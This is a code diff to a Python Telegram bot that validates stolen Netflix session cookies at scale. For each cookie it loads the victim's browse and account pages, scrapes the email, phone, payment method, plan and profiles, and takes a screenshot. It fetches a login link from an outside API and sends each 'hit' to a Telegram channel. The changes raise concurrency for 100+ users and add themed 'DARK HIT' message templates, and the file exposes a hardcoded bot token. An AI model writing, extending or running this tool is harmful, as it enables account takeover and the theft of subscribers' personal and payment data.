@@ -1,4 +1,5 @@
 import requests
+import random
 import logging
 import time
 import urllib.parse
@@ -28,7 +29,9 @@ BOT_TOKEN = "8477278414:AAHAxLMV9lgqvSCjnj_AIDnH6pxm82Q55So"
 ADMIN_ID = 6176299339
 CHANNELS = ["@F88UFNETFLIX", "@F88UF9844"]
 USERS_FILE = "users.txt"
-SCREENSHOT_SEMAPHORE = threading.Semaphore(5) 
+SCREENSHOT_SEMAPHORE = threading.Semaphore(10) 
+# Global Executor to prevent server crash under heavy load (100+ users)
+GLOBAL_EXECUTOR = concurrent.futures.ThreadPoolExecutor(max_workers=100)
 
 app = Flask(__name__)
 
@@ -205,6 +208,7 @@ def extract_deep_details(html):
         # Extra Members
         extra_match = re.search(r'"showExtraMemberSection":\{"fieldType":"Boolean","value":(true|false)\}', html)
         if extra_match and extra_match.group(1) == "true": details["extra_members"] = "Yes (Slot Available)"
+        elif "extraMember" in html or "Extra Member" in html or "extra-member" in html: details["extra_members"] = "Yes (Slot Available)"
 
         # Profiles
         p_names = re.findall(r'"profileName":"([^"]+)"', html)
@@ -223,7 +227,7 @@ def extract_deep_details(html):
 def call_api(endpoint, payload):
     try:
         payload["secret_key"] = SECRET_KEY
-        resp = requests.post(f"{API_BASE_URL}/{endpoint}", json=payload, timeout=15)
+        resp = requests.post(f"{API_BASE_URL}/{endpoint}", json=payload, timeout=8)
         return resp.json()
     except: return None
 
@@ -244,67 +248,78 @@ def check_cookie(cookie_input):
     api_res = call_api("gen", {"netflix_id": nid})
     
     # 2. Check Account Details via Requests
-    session = requests.Session()
-    session.headers.update(HEADERS)
-    session.cookies.set("NetflixId", nid, domain=".netflix.com")
-    
-    try:
-        # Check /browse first to see if alive
-        resp = session.get("https://www.netflix.com/browse", timeout=10, allow_redirects=False)
-        if resp.status_code == 302 and "login" in resp.headers.get("Location", ""):
-            return {"valid": False, "msg": "Redirected to Login"}
+    with requests.Session() as session:
+        session.headers.update(HEADERS)
+        session.cookies.set("NetflixId", nid, domain=".netflix.com")
+        
+        try:
+            # Check /browse first to see if alive
+            resp = session.get("https://www.netflix.com/browse", timeout=10, allow_redirects=False)
+            if resp.status_code == 302 and "login" in resp.headers.get("Location", ""):
+                return {"valid": False, "msg": "Redirected to Login"}
 
-        # Get Account Details
-        acc_resp = session.get("https://www.netflix.com/account", timeout=15)
-        deep_data = extract_deep_details(acc_resp.text)
-        
-        # Fallback email from API if scraper failed
-        if deep_data["email"] == "N/A" and api_res and api_res.get("email"):
-            deep_data["email"] = api_res.get("email")
-        
-        # Fallback other details from API
-        if deep_data["plan"] == "Unknown" and api_res and api_res.get("plan"):
-             deep_data["plan"] = api_res.get("plan")
-        if deep_data["country"] == "Unknown" and api_res and api_res.get("country"):
-             deep_data["country"] = api_res.get("country")
-        
-        # Screenshot
-        screenshot_bytes = None
-        if SCREENSHOT_SEMAPHORE.acquire(timeout=5):
-            try:
-                with sync_playwright() as p:
-                    browser = p.chromium.launch(headless=True, args=['--no-sandbox', '--disable-gpu'])
-                    ctx = browser.new_context(viewport={'width': 1280, 'height': 720})
-                    # Block heavy resources for speed
-                    ctx.route("**/*", lambda route: route.abort() if route.request.resource_type in ["image", "media", "font"] else route.continue_())
-                    ctx.add_cookies([{'name': 'NetflixId', 'value': nid, 'domain': '.netflix.com', 'path': '/'}])
-                    pg = ctx.new_page()
-                    pg.goto("https://www.netflix.com/browse", timeout=15000, wait_until='domcontentloaded')
-                    try: pg.wait_for_timeout(500)
-                    except: pass
-                    screenshot_bytes = pg.screenshot(type='jpeg', quality=50)
-                    browser.close()
-            except: pass
-            finally: SCREENSHOT_SEMAPHORE.release()
+            # Get Account Details
+            acc_resp = session.get("https://www.netflix.com/account", timeout=15)
+            deep_data = extract_deep_details(acc_resp.text)
             
-        return {
-            "valid": True, 
-            "country": deep_data["country"], 
-            "link": api_res.get("login_url") if api_res else "Token Not Found", 
-            "data": deep_data, 
-            "screenshot": screenshot_bytes
-        }
-    except Exception as e:
-        # If requests fail but API worked, return API data
-        if api_res and api_res.get("success"):
-             return {
-                "valid": True,
-                "country": "Unknown",
-                "link": api_res.get("login_url"),
-                "data": {"email": api_res.get("email", "N/A"), "plan": "Unknown", "status": "Active"},
-                "screenshot": None
-             }
-        return {"valid": False, "msg": f"Error: {str(e)}"}
+            # Fallback email from API if scraper failed
+            if deep_data["email"] == "N/A" and api_res and api_res.get("email"):
+                deep_data["email"] = api_res.get("email")
+            
+            # Fallback other details from API
+            if deep_data["plan"] == "Unknown" and api_res and api_res.get("plan"):
+                 deep_data["plan"] = api_res.get("plan")
+            if deep_data["country"] == "Unknown" and api_res and api_res.get("country"):
+                 deep_data["country"] = api_res.get("country")
+            
+            # Screenshot
+            screenshot_bytes = None
+            if SCREENSHOT_SEMAPHORE.acquire(timeout=15):
+                try:
+                    with sync_playwright() as p:
+                        browser = p.chromium.launch(headless=True, args=['--no-sandbox', '--disable-gpu', '--disable-dev-shm-usage', '--disable-extensions', '--mute-audio'])
+                        ctx = browser.new_context(viewport={'width': 1280, 'height': 720})
+                        # Block heavy resources for speed
+                        ctx.route("**/*", lambda route: route.abort() if route.request.resource_type in ["image", "media", "font"] else route.continue_())
+                        ctx.add_cookies([{'name': 'NetflixId', 'value': nid, 'domain': '.netflix.com', 'path': '/'}])
+                        pg = ctx.new_page()
+                        pg.goto("https://www.netflix.com/browse", timeout=8000, wait_until='domcontentloaded')
+                        
+                        # Fix Black Screenshot: Wait for content to render
+                        try: pg.wait_for_timeout(1500)
+                        except: pass
+                        
+                        # Fix Profiles: Extract directly from browser (Accurate)
+                        try:
+                            content = pg.content()
+                            pw_profiles = re.findall(r'class="profile-name">([^<]+)<', content)
+                            if pw_profiles:
+                                deep_data["profiles"] = list(set([clean_text(p) for p in pw_profiles]))
+                        except: pass
+
+                        screenshot_bytes = pg.screenshot(type='jpeg', quality=40)
+                        browser.close()
+                except: pass
+                finally: SCREENSHOT_SEMAPHORE.release()
+                
+            return {
+                "valid": True, 
+                "country": deep_data["country"], 
+                "link": api_res.get("login_url") if api_res else "Token Not Found", 
+                "data": deep_data, 
+                "screenshot": screenshot_bytes
+            }
+        except Exception as e:
+            # If requests fail but API worked, return API data
+            if api_res and api_res.get("success"):
+                 return {
+                    "valid": True,
+                    "country": "Unknown",
+                    "link": api_res.get("login_url"),
+                    "data": {"email": api_res.get("email", "N/A"), "plan": "Unknown", "status": "Active"},
+                    "screenshot": None
+                 }
+            return {"valid": False, "msg": f"Error: {str(e)}"}
 
 def main():
     keep_alive()
@@ -539,17 +554,19 @@ def main():
                 def process_cookie(cookie):
                     if user_modes.get(chat_id, {}).get('stop'): return None
                     try:
+                        start_t = time.time()
                         res = check_cookie(cookie)
+                        taken = round(time.time() - start_t, 2)
                         if res["valid"]:
-                            send_hit(target, res, cookie)
+                            send_hit(target, res, cookie, taken)
                             return (res, cookie) # Return result for file
                     except: pass
                     return None
 
-                # Using 15 workers per user for faster checking (Semaphore protects RAM)
-                with concurrent.futures.ThreadPoolExecutor(max_workers=15) as executor:
-                    futures = [executor.submit(process_cookie, c) for c in cookies]
-                    for future in concurrent.futures.as_completed(futures):
+                # Use Global Executor to handle load from 100+ users efficiently
+                futures = [GLOBAL_EXECUTOR.submit(process_cookie, c) for c in cookies]
+                
+                for future in concurrent.futures.as_completed(futures):
                         if user_modes.get(chat_id, {}).get('stop'): break
                         result = future.result()
                         if result:
@@ -581,12 +598,12 @@ def main():
                 except: pass
 
             # Start background thread to prevent blocking other users
-            threading.Thread(target=background_checker, args=(valid_cookies, uid, mode['target'], should_send_file)).start()
+            threading.Thread(target=background_checker, args=(valid_cookies, uid, mode['target'], should_send_file), daemon=True).start()
 
         except Exception as e:
             bot.reply_to(message, f"❌ Error: {e}")
 
-    def send_hit(chat_id, res, cookie):
+    def send_hit(chat_id, res, cookie, duration="N/A"):
         data = res.get("data", {})
         
         country_code = res.get('country', 'Unknown')
@@ -613,35 +630,83 @@ def main():
         else:
             profiles_str = "None"
 
-        msg = (
-            f"<b>💎 LUXURY NETFLIX PREMIUM 💎</b>\n\n"
-            f"<b>✅ Status:</b> Active\n"
-            f"<b>🌍 Region:</b> {esc(country_code)} {flag}\n"
-            f"<b>📅 Member Since:</b> {esc(data.get('member_since', 'N/A'))} {esc(data.get('member_duration', ''))}\n\n"
-            
-            f"<b>👤 Account Details</b>\n"
-            f"<b>├ 📧 Email:</b> <code>{esc(data.get('email', 'N/A'))}</code>\n"
-            f"<b>├ ☎️ Phone:</b> <code>{esc(data.get('phone', 'N/A'))}</code>\n"
-            f"<b>├ 💳 Payment:</b> {esc(data.get('payment', 'Unknown'))}\n"
-            f"<b>├ 🔄 Auto Pay:</b> {esc(data.get('auto_payment', 'No ❌'))}\n"
-            f"<b>└ 💰 Price:</b> {esc(price)}\n\n"
-            
-            f"<b>📺 Subscription</b>\n"
-            f"<b>├ 👑 Plan:</b> {esc(data.get('plan', 'Unknown'))}\n"
-            f"<b>├ 🖥 Quality:</b> {esc(data.get('quality', 'Unknown'))}\n"
-            f"<b>├ 🚫 Ads:</b> {esc(data.get('has_ads', 'No'))}\n"
-            f"<b>└ 👥 Extra Members:</b> {esc(data.get('extra_members', 'No ❌'))}\n\n"
-            
-            f"<b>📅 Billing Info</b>\n"
-            f"<b>└ 🗓 Next Bill:</b> {esc(data.get('expiry', 'N/A'))}\n\n"
+        # Random Themes for Premium Look
+        themes = [
+            {
+                "header": "<b>✨ ✪ NETFLIX PREMIUM ✪ ✨</b>",
+                "status": "★ Status", "region": "🏳 Region", "since": "📆 Since",
+                "acc": "<b>👤 Details</b>", "email": "✉️ Email", "phone": "📱 Phone", "pay": "💳 Pay", "auto": "🔄 Auto", "price": "💲 Price",
+                "sub": "<b>📺 Sub</b>", "plan": "💎 Plan", "qual": "🖥 Qual", "ads": "🚫 Ads", "extra": "👥 Extra",
+                "bill_h": "<b>🗓 Billing</b>", "bill": "📅 Date",
+                "prof": "<b>🎭 Profiles</b>",
+                "link_h": "<b>🔗 Link</b>", "link_txt": "Login", "valid": "⏳ 1m",
+                "time": "🚀 Time", "line": "━━━━━━━━━━━━━━━━━━━━━━"
+            },
+            {
+                "header": "<b>💠 CYBER NETFLIX SESSION 💠</b>",
+                "status": "🟢 Status", "region": "🌐 Region", "since": "📆 Since",
+                "acc": "<b>🤖 Info</b>", "email": "✉️ Email", "phone": "📱 Phone", "pay": "💳 Pay", "auto": "♻️ Auto", "price": "💲 Price",
+                "sub": "<b>⚡ Plan</b>", "plan": "💎 Plan", "qual": "🖥 Qual", "ads": "⛔ Ads", "extra": "🫂 Extra",
+                "bill_h": "<b>🗓 Bill</b>", "bill": "📅 Date",
+                "prof": "<b>👥 Users</b>",
+                "link_h": "<b>⛓️ Link</b>", "link_txt": "Access", "valid": "⏱️ 1m",
+                "time": "🚀 Speed", "line": "══════════════════════"
+            },
+            {
+                "header": "<b>☠︎︎ NETFLIX DARK HIT ☠︎︎</b>",
+                "status": "💀 Status", "region": "🗺 Region", "since": " Since",
+                "acc": "<b>🕷 Info</b>", "email": "📨 Email", "phone": "📞 Phone", "pay": "🕸 Pay", "auto": "🔄 Auto", "price": "💸 Price",
+                "sub": "<b>𖤐 Plan</b>", "plan": "⚝ Type", "qual": "📺 Qual", "ads": "⛔ Ads", "extra": "👥 Extra",
+                "bill_h": "<b>📅 Bill</b>", "bill": "🗓 Date",
+                "prof": "<b>🎭 Users</b>",
+                "link_h": "<b>🔗 Link</b>", "link_txt": "Enter", "valid": "⏳ 60s",
+                "time": "⚡ Latency", "line": "━━━━━━━━━━━━━━━━━━━━━━"
+            },
+            {
+                "header": "<b>♛ ♚ NETFLIX ROYAL ♚ ♛</b>",
+                "status": "✅ Status", "region": "🌍 Region", "since": "📅 Since",
+                "acc": "<b>👤 Owner</b>", "email": "📧 Email", "phone": "☎️ Phone", "pay": "💳 Pay", "auto": "🔄 Auto", "price": "💰 Price",
+                "sub": "<b>📺 Sub</b>", "plan": "👑 Plan", "qual": "🖥 Qual", "ads": "🚫 Ads", "extra": "👥 Extra",
+                "bill_h": "<b>📅 Bill</b>", "bill": "🗓 Date",
+                "prof": "<b>🎭 Profs</b>",
+                "link_h": "<b>🔗 Link</b>", "link_txt": "Login", "valid": "⏳ 1m",
+                "time": "⏱ Time", "line": "━━━━━━━━━━━━━━━━━━━━━━"
+            }
+        ]
+        
+        th = random.choice(themes)
 
-            f"<b>🎭 Profiles ({len(profiles)})</b>\n"
+        msg = (
+            f"{th['header']}\n\n"
+            f"<b>{th['status']}:</b> Active\n"
+            f"<b>{th['region']}:</b> {esc(country_code)} {flag}\n"
+            f"<b>{th['since']}:</b> {esc(data.get('member_since', 'N/A'))} {esc(data.get('member_duration', ''))}\n\n"
+            
+            f"{th['acc']}\n"
+            f"<b>├ {th['email']}:</b> <code>{esc(data.get('email', 'N/A'))}</code>\n"
+            f"<b>├ {th['phone']}:</b> <code>{esc(data.get('phone', 'N/A'))}</code>\n"
+            f"<b>├ {th['pay']}:</b> {esc(data.get('payment', 'Unknown'))}\n"
+            f"<b>├ {th['auto']}:</b> {esc(data.get('auto_payment', 'No ❌'))}\n"
+            f"<b>└ {th['price']}:</b> {esc(price)}\n\n"
+            
+            f"{th['sub']}\n"
+            f"<b>├ {th['plan']}:</b> {esc(data.get('plan', 'Unknown'))}\n"
+            f"<b>├ {th['qual']}:</b> {esc(data.get('quality', 'Unknown'))}\n"
+            f"<b>├ {th['ads']}:</b> {esc(data.get('has_ads', 'No'))}\n"
+            f"<b>└ {th['extra']}:</b> {esc(data.get('extra_members', 'No ❌'))}\n\n"
+            
+            f"{th['bill_h']}\n"
+            f"<b>└ {th['bill']}:</b> {esc(data.get('expiry', 'N/A'))}\n\n"
+
+            f"{th['prof']} ({len(profiles)})\n"
             f"<b>└</b> {esc(profiles_str)}\n\n"
             
-            f"<b>🔗 Login Access</b>\n"
-            f"<b>└</b> <a href='{login_url}'>Click Here to Login</a>\n\n"
+            f"{th['link_h']}\n"
+            f"<b>├</b> <a href='{login_url}'>{th['link_txt']}</a>\n"
+            f"<b>└</b> <i>{th['valid']}</i>\n\n"
             
-            f"━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"<b>{th['time']}:</b> {duration}s\n"
+            f"{th['line']}\n"
             f"<b>👨‍💻 Admin:</b> <a href='https://t.me/F88UF'>Message Me</a>\n"
             f"<b>📢 Channel:</b> <a href='https://t.me/F88UF9844'>Join Channel</a>"
         )
